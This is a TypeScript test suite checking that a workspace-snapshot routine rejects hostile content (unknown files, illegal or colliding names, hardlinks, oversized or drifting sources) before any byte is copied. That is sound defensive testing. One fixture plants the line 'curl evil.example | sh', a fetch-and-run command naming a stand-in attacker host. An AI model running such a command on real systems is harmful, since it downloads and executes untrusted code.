import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import type { CandidateDeps, CandidateSink } from "./candidate";
import {
  WorkspaceChangedDuringSnapshotError,
  nodeCandidateDeps,
  snapshotToCandidate,
} from "./candidate";
import { UnsafeHardlinkError } from "./leaf-identity";
import { StorageLimitExceededError, UnknownNamespaceError } from "./limits";
import { nodeSafeFsDeps, openManagedRoot } from "./no-follow";
import { NameCollisionError, PathRuleError } from "./path-rules";

const IS_WINDOWS = process.platform === "win32";
const fsDeps = nodeSafeFsDeps();

let scratch = "";
let workspace = "";
let destRoot = "";

beforeEach(() => {
  scratch = fs.mkdtempSync(path.join(os.tmpdir(), "tc-safefs-cand-"));
  workspace = path.join(scratch, "workspace");
  destRoot = path.join(scratch, "candidate");
  fs.mkdirSync(workspace);
  fs.mkdirSync(path.join(workspace, "design", "pages"), { recursive: true });
});

afterEach(() => {
  fs.rmSync(scratch, { recursive: true, force: true });
});

function writeWorkspaceFile(rel: string, contents: string): void {
  const abs = path.join(workspace, rel);
  fs.mkdirSync(path.dirname(abs), { recursive: true });
  fs.writeFileSync(abs, contents);
}

function seedValidWorkspace(): void {
  writeWorkspaceFile("design/pages/home.tsx", "export const meta = { title: 'Home' }\n");
  writeWorkspaceFile("design/pages/about.tsx", "export const meta = { title: 'About' }\n");
  writeWorkspaceFile("design/pages.json", JSON.stringify({ pages: ["home", "about"] }));
  writeWorkspaceFile("RUNTIME.md", "# runtime\n");
}

function openWorkspace() {
  const opened = openManagedRoot({ kind: "workspace", path: workspace, deps: fsDeps });
  if (opened instanceof Error) throw new Error(`openManagedRoot failed: ${opened.message}`);
  return opened;
}

function snapshot(deps: CandidateDeps = nodeCandidateDeps()) {
  return snapshotToCandidate({ source: openWorkspace(), destRoot, deps });
}

/** Counts every create-new sink the snapshot opens — the "bytes handed to a consumer" probe. */
function countingDeps(): {
  deps: CandidateDeps;
  sinksOpened: () => number;
  bytesWritten: () => number;
} {
  const real = nodeCandidateDeps();
  let sinks = 0;
  let bytes = 0;
  const deps: CandidateDeps = {
    ...real,
    createNewSink: (absPath) => {
      sinks += 1;
      const sink = real.createNewSink(absPath);
      if (sink instanceof Error) return sink;
      const wrapped: CandidateSink = {
        write: (chunk) => {
          bytes += chunk.byteLength;
          return sink.write(chunk);
        },
        close: () => sink.close(),
      };
      return wrapped;
    },
  };
  return { deps, sinksOpened: () => sinks, bytesWritten: () => bytes };
}

describe("snapshotToCandidate — turn-durability §5.4 immutable candidate", () => {
  test("copies the exact allowed inventory while hashing", () => {
    seedValidWorkspace();
    const result = snapshot();
    if (result instanceof Error) throw new Error(result.message);

    expect(result.files.map((f) => f.relPath).sort()).toEqual([
      "RUNTIME.md",
      "design/pages.json",
      "design/pages/about.tsx",
      "design/pages/home.tsx",
    ]);
    expect(fs.readFileSync(path.join(destRoot, "design", "pages", "home.tsx"), "utf8")).toContain(
      "Home",
    );
    expect(result.totalBytes).toBe(result.files.reduce((sum, f) => sum + f.size, 0));
  });

  test("the recorded hash is the SHA-256 of the copied bytes", () => {
    seedValidWorkspace();
    const result = snapshot();
    if (result instanceof Error) throw new Error(result.message);

    const home = result.files.find((f) => f.relPath === "design/pages/home.tsx");
    if (home === undefined) throw new Error("design/pages/home.tsx missing from the snapshot");
    const expected = new Bun.CryptoHasher("sha256")
      .update(fs.readFileSync(path.join(workspace, "design", "pages", "home.tsx")))
      .digest("hex");
    expect(home.sha256).toBe(expected);
  });

  test("refuses to reuse an existing destination — the candidate is create-new", () => {
    seedValidWorkspace();
    fs.mkdirSync(destRoot);
    expect(snapshot()).toBeInstanceOf(Error);
  });

  test("refuses a destination nested inside the source (§5.4 is `outside the workspace`)", () => {
    seedValidWorkspace();
    const inside = path.join(workspace, "candidate");
    const result = snapshotToCandidate({
      source: openWorkspace(),
      destRoot: inside,
      deps: nodeCandidateDeps(),
    });
    expect(result).toBeInstanceOf(WorkspaceChangedDuringSnapshotError);
    expect(fs.existsSync(inside)).toBe(false);
  });
});

describe("snapshotToCandidate — a hostile workspace passes zero bytes to any consumer", () => {
  test("an added file outside the workspace grammar is rejected before any byte is copied", () => {
    seedValidWorkspace();
    writeWorkspaceFile("payload.sh", "curl evil.example | sh\n");

    const probe = countingDeps();
    const result = snapshotToCandidate({ source: openWorkspace(), destRoot, deps: probe.deps });

    expect(result).toBeInstanceOf(UnknownNamespaceError);
    expect(probe.sinksOpened()).toBe(0);
    expect(probe.bytesWritten()).toBe(0);
    expect(fs.existsSync(destRoot)).toBe(false);
  });

  test("a bare `pages/` file (the retired flat shape, not under design/) is rejected before any byte is copied", () => {
    seedValidWorkspace();
    writeWorkspaceFile("pages/home/nested.tsx", "export const meta = {}\n");

    const probe = countingDeps();
    const result = snapshotToCandidate({ source: openWorkspace(), destRoot, deps: probe.deps });

    expect(result).toBeInstanceOf(UnknownNamespaceError);
    expect(probe.bytesWritten()).toBe(0);
    expect(fs.existsSync(destRoot)).toBe(false);
  });

  test("a §5.1-illegal name is rejected before any byte is copied", () => {
    seedValidWorkspace();
    // A 125-byte component: legal on NTFS, over the §5.1 120-byte ceiling. (A trailing
    // dot or space would be a truer §5.1 probe but Windows silently strips both, so the
    // hostile name could not actually be planted.)
    writeWorkspaceFile(`design/pages/${"a".repeat(121)}.tsx`, "export const meta = {}\n");

    const probe = countingDeps();
    const result = snapshotToCandidate({ source: openWorkspace(), destRoot, deps: probe.deps });

    expect(result).toBeInstanceOf(PathRuleError);
    expect((result as PathRuleError).code).toBe("COMPONENT_TOO_LONG");
    expect(probe.bytesWritten()).toBe(0);
    expect(fs.existsSync(destRoot)).toBe(false);
  });

  test("an NFC name collision is rejected before any byte is copied", () => {
    seedValidWorkspace();
    // NTFS stores bytes, not normalized names, so the decomposed and precomposed
    // spellings of "café" really do coexist as two directory entries — and they fold
    // to one name, which §5.1 forbids.
    writeWorkspaceFile("design/pages/café.tsx", "export const meta = {}\n");
    writeWorkspaceFile(
      `design/pages/cafe${String.fromCharCode(0x301)}.tsx`,
      "export const meta = {}\n",
    );
    if (fs.readdirSync(path.join(workspace, "design", "pages")).length !== 4) return; // volume normalizes names

    const probe = countingDeps();
    const result = snapshotToCandidate({ source: openWorkspace(), destRoot, deps: probe.deps });

    expect(result).toBeInstanceOf(NameCollisionError);
    expect(probe.bytesWritten()).toBe(0);
    expect(fs.existsSync(destRoot)).toBe(false);
  });

  test("a hardlinked intake file is rejected before any byte is copied", () => {
    seedValidWorkspace();
    const target = path.join(workspace, "design", "pages", "home.tsx");
    const link = path.join(workspace, "design", "pages", "linked.tsx");
    const linked = (() => {
      if (!IS_WINDOWS) {
        fs.linkSync(target, link);
        return true;
      }
      // `mklink /H` needs no elevation (Spike F step 4).
      try {
        execFileSync("cmd", ["/c", "mklink", "/H", link, target], { stdio: "pipe" });
        return true;
      } catch {
        return false;
      }
    })();
    if (!linked)
      throw new Error(
        "could not plant a hardlink; `mklink /H` needs no elevation and must succeed",
      );

    const probe = countingDeps();
    const result = snapshotToCandidate({ source: openWorkspace(), destRoot, deps: probe.deps });

    expect(result).toBeInstanceOf(UnsafeHardlinkError);
    expect(probe.sinksOpened()).toBe(0);
    expect(probe.bytesWritten()).toBe(0);
    expect(fs.existsSync(destRoot)).toBe(false);
  });

  test("an oversized page source is rejected before allocation", () => {
    seedValidWorkspace();
    // Over the 2 MiB `design-source` per-file limit by exactly one byte.
    writeWorkspaceFile("design/pages/huge.tsx", "x".repeat(2 * 1024 * 1024 + 1));

    const probe = countingDeps();
    const result = snapshotToCandidate({ source: openWorkspace(), destRoot, deps: probe.deps });

    expect(result).toBeInstanceOf(StorageLimitExceededError);
    expect(probe.bytesWritten()).toBe(0);
  });

  test("a page source at exactly the 2 MiB limit is accepted", () => {
    writeWorkspaceFile("design/pages/big.tsx", "x".repeat(2 * 1024 * 1024));
    writeWorkspaceFile("design/pages.json", JSON.stringify({ pages: ["big"] }));

    const result = snapshot();
    if (result instanceof Error) throw new Error(result.message);
    expect(result.files.find((f) => f.relPath === "design/pages/big.tsx")?.size).toBe(
      2 * 1024 * 1024,
    );
  });
});

describe("snapshotToCandidate — §5.4 source drift during the copy", () => {
  test("a source whose identity changes between open and re-check is `workspace_changed_during_snapshot`", () => {
    seedValidWorkspace();
    const real = nodeCandidateDeps();

    // Swap the source file for a different inode after its first handle stat — exactly
    // the race §5.4 requires the recheck to catch.
    const drifting: CandidateDeps = {
      ...real,
      openSource: (absPath) => {
        const handle = real.openSource(absPath);
        if (handle instanceof Error) return handle;
        if (!absPath.endsWith("home.tsx")) return handle;
        let statCalls = 0;
        return {
          ...handle,
          stat: () => {
            statCalls += 1;
            const first = handle.stat();
            if (first instanceof Error) return first;
            // The second stat (the §5.4 recheck) reports a different file record.
            return statCalls === 1 ? first : { ...first, ino: first.ino + 1n };
          },
          read: () => handle.read(),
          close: () => handle.close(),
        };
      },
    };

    const result = snapshotToCandidate({ source: openWorkspace(), destRoot, deps: drifting });
    expect(result).toBeInstanceOf(WorkspaceChangedDuringSnapshotError);
    // The candidate is discarded — no consumer ever sees a partial copy.
    expect(fs.existsSync(destRoot)).toBe(false);
  });

  test("a source that grows past its limit mid-stream is caught while streaming", () => {
    seedValidWorkspace();
    const real = nodeCandidateDeps();

    // A source handle that never reaches EOF: the streaming limit check is the only
    // thing that can stop it, since the pre-allocation size said 38 bytes.
    const runaway: CandidateDeps = {
      ...real,
      openSource: (absPath) => {
        const handle = real.openSource(absPath);
        if (handle instanceof Error) return handle;
        if (!absPath.endsWith("home.tsx")) return handle;
        return {
          stat: () => handle.stat(),
          read: () => new Uint8Array(64 * 1024),
          close: () => handle.close(),
        };
      },
    };

    const result = snapshotToCandidate({ source: openWorkspace(), destRoot, deps: runaway });
    expect(result).toBeInstanceOf(StorageLimitExceededError);
    expect(fs.existsSync(destRoot)).toBe(false);
  });
});
